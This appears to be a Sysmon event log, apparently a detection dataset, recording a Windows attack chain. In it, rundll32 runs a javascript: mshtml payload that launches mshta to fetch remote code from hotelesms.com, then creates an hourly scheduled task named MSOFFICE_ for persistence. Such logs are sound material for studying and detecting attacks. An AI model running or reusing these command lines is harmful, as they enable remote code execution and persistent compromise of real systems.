<root>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-21T15:32:57.286254600Z" />
      <EventRecordID>4125</EventRecordID>
      <Correlation />
      <Execution ProcessID="3416" ThreadID="3496" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-21 15:32:57.276</Data>
      <Data Name="ProcessGuid">{365ABB72-1A29-5CE4-0000-001054E32101}</Data>
      <Data Name="ProcessId">1532</Data>
      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
      <Data Name="FileVersion">6.1.7601.17514 (win7sp1_rtm.101119-1850)</Data>
      <Data Name="Description">Windows Command Processor</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">cmd.exe  /C rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%%20ActiveXObject("WScript.Shell").run("mshta https://hotelesms.com/talsk.txt",0,true);</Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Desktop\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-39CC-5CE3-0000-002096C70000}</Data>
      <Data Name="LogonId">0xc796</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163</Data>
      <Data Name="ParentProcessGuid">{365ABB72-4F8A-5CE3-0000-0010C5BB4800}</Data>
      <Data Name="ParentProcessId">3548</Data>
      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
      <Data Name="ParentCommandLine">"cmd.exe" /s /k pushd "C:\Users\IEUser\Desktop"</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-21T15:32:57.286254600Z" />
      <EventRecordID>4126</EventRecordID>
      <Correlation />
      <Execution ProcessID="3416" ThreadID="3496" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-21 15:32:57.276</Data>
      <Data Name="ProcessGuid">{365ABB72-1A29-5CE4-0000-00107BE42101}</Data>
      <Data Name="ProcessId">2920</Data>
      <Data Name="Image">C:\Windows\System32\rundll32.exe</Data>
      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
      <Data Name="Description">Windows host process (Rundll32)</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">rundll32.exe  javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%%20ActiveXObject("WScript.Shell").run("mshta https://hotelesms.com/talsk.txt",0,true);</Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Desktop\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-39CC-5CE3-0000-002096C70000}</Data>
      <Data Name="LogonId">0xc796</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=892503B20247B341CFD20DDA5FDACFA41527A087,MD5=C648901695E275C8F2AD04B687A68CE2,SHA256=3FA4912EB43FC304652D7B01F118589259861E2D628FA7C86193E54D5F987670,IMPHASH=239D911DFA7551A8B735680BC39B2238</Data>
      <Data Name="ParentProcessGuid">{365ABB72-1A29-5CE4-0000-001054E32101}</Data>
      <Data Name="ParentProcessId">1532</Data>
      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
      <Data Name="ParentCommandLine">cmd.exe  /C rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("mshta https://hotelesms.com/talsk.txt",0,true);</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-21T15:32:57.867089800Z" />
      <EventRecordID>4127</EventRecordID>
      <Correlation />
      <Execution ProcessID="3416" ThreadID="3496" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-21 15:32:57.837</Data>
      <Data Name="ProcessGuid">{365ABB72-1A29-5CE4-0000-001079F92101}</Data>
      <Data Name="ProcessId">2432</Data>
      <Data Name="Image">C:\Windows\System32\mshta.exe</Data>
      <Data Name="FileVersion">11.00.9600.16428 (winblue_gdr.131013-1700)</Data>
      <Data Name="Description">Microsoft (R) HTML Application host</Data>
      <Data Name="Product">Internet Explorer</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">"C:\Windows\System32\mshta.exe" https://hotelesms.com/talsk.txt</Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Desktop\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-39CC-5CE3-0000-002096C70000}</Data>
      <Data Name="LogonId">0xc796</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=D4F0397F83083E1C6FB0894187CC72AEBCF2F34F,MD5=ABDFC692D9FE43E2BA8FE6CB5A8CB95A,SHA256=949485BA939953642714AE6831D7DCB261691CAC7CBB8C1A9220333801F60820,IMPHASH=00B1859A95A316FD37DFF4210480907A</Data>
      <Data Name="ParentProcessGuid">{365ABB72-1A29-5CE4-0000-00107BE42101}</Data>
      <Data Name="ParentProcessId">2920</Data>
      <Data Name="ParentImage">C:\Windows\System32\rundll32.exe</Data>
      <Data Name="ParentCommandLine">rundll32.exe  javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("mshta https://hotelesms.com/talsk.txt",0,true);</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>3</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>3</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-21T15:32:59.389278600Z" />
      <EventRecordID>4128</EventRecordID>
      <Correlation />
      <Execution ProcessID="3416" ThreadID="3628" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-21 06:58:39.888</Data>
      <Data Name="ProcessGuid">{365ABB72-1A29-5CE4-0000-001079F92101}</Data>
      <Data Name="ProcessId">2432</Data>
      <Data Name="Image">C:\Windows\System32\mshta.exe</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="Protocol">tcp</Data>
      <Data Name="Initiated">true</Data>
      <Data Name="SourceIsIpv6">false</Data>
      <Data Name="SourceIp">10.0.2.15</Data>
      <Data Name="SourceHostname">IEWIN7..home</Data>
      <Data Name="SourcePort">49703</Data>
      <Data Name="SourcePortName">
      </Data>
      <Data Name="DestinationIsIpv6">false</Data>
      <Data Name="DestinationIp">108.179.232.58</Data>
      <Data Name="DestinationHostname">gator4243.hostgator.com</Data>
      <Data Name="DestinationPort">443</Data>
      <Data Name="DestinationPortName">https</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-21T15:32:59.769825800Z" />
      <EventRecordID>4129</EventRecordID>
      <Correlation />
      <Execution ProcessID="3416" ThreadID="3496" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-21 15:32:59.729</Data>
      <Data Name="ProcessGuid">{365ABB72-1A2B-5CE4-0000-00102F502201}</Data>
      <Data Name="ProcessId">3772</Data>
      <Data Name="Image">C:\Windows\System32\schtasks.exe</Data>
      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
      <Data Name="Description">Manages scheduled tasks</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">"C:\Windows\System32\schtasks.exe" /Create /sc MINUTE /MO 60 /TN MSOFFICE_ /TR "mshta.exe https://hotelesms.com/Injection.txt" /F </Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Desktop\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-39CC-5CE3-0000-002096C70000}</Data>
      <Data Name="LogonId">0xc796</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=8A7E8B05A122B768AB85466B2A3DAF7A358F90F4,MD5=2003E9B15E1C502B146DAD2E383AC1E3,SHA256=15018D0093BEFABBA8B927743191030D1F8C17BB97FDB48C2FC3EAB20E2D4B3D,IMPHASH=D92C80D49382091310FB8DB089F856A9</Data>
      <Data Name="ParentProcessGuid">{365ABB72-1A29-5CE4-0000-001079F92101}</Data>
      <Data Name="ParentProcessId">2432</Data>
      <Data Name="ParentImage">C:\Windows\System32\mshta.exe</Data>
      <Data Name="ParentCommandLine">"C:\Windows\System32\mshta.exe" https://hotelesms.com/talsk.txt</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-21T15:32:59.809883400Z" />
      <EventRecordID>4130</EventRecordID>
      <Correlation />
      <Execution ProcessID="3416" ThreadID="3496" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-21 15:32:59.809</Data>
      <Data Name="ProcessGuid">{365ABB72-39CB-5CE3-0000-0010E0AC0000}</Data>
      <Data Name="ProcessId">856</Data>
      <Data Name="Image">C:\Windows\system32\svchost.exe</Data>
      <Data Name="TargetFilename">C:\Windows\System32\Tasks\MSOFFICE_</Data>
      <Data Name="CreationUtcTime">2019-05-21 15:32:59.809</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>3</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>3</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-21T15:33:00.140358600Z" />
      <EventRecordID>4131</EventRecordID>
      <Correlation />
      <Execution ProcessID="3416" ThreadID="3628" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-21 06:58:40.518</Data>
      <Data Name="ProcessGuid">{365ABB72-1A29-5CE4-0000-001079F92101}</Data>
      <Data Name="ProcessId">2432</Data>
      <Data Name="Image">C:\Windows\System32\mshta.exe</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="Protocol">tcp</Data>
      <Data Name="Initiated">true</Data>
      <Data Name="SourceIsIpv6">false</Data>
      <Data Name="SourceIp">10.0.2.15</Data>
      <Data Name="SourceHostname">IEWIN7..home</Data>
      <Data Name="SourcePort">49704</Data>
      <Data Name="SourcePortName">
      </Data>
      <Data Name="DestinationIsIpv6">false</Data>
      <Data Name="DestinationIp">105.73.6.112</Data>
      <Data Name="DestinationHostname">aka112.inwitelecom.net</Data>
      <Data Name="DestinationPort">80</Data>
      <Data Name="DestinationPortName">http</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>3</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>3</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-21T15:33:01.141798600Z" />
      <EventRecordID>4132</EventRecordID>
      <Correlation />
      <Execution ProcessID="3416" ThreadID="3628" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-21 06:58:40.721</Data>
      <Data Name="ProcessGuid">{365ABB72-1A29-5CE4-0000-001079F92101}</Data>
      <Data Name="ProcessId">2432</Data>
      <Data Name="Image">C:\Windows\System32\mshta.exe</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="Protocol">tcp</Data>
      <Data Name="Initiated">true</Data>
      <Data Name="SourceIsIpv6">false</Data>
      <Data Name="SourceIp">10.0.2.15</Data>
      <Data Name="SourceHostname">IEWIN7..home</Data>
      <Data Name="SourcePort">49705</Data>
      <Data Name="SourcePortName">
      </Data>
      <Data Name="DestinationIsIpv6">false</Data>
      <Data Name="DestinationIp">105.73.6.105</Data>
      <Data Name="DestinationHostname">aka105.inwitelecom.net</Data>
      <Data Name="DestinationPort">80</Data>
      <Data Name="DestinationPortName">http</Data>
    </EventData>
  </Event>
</root>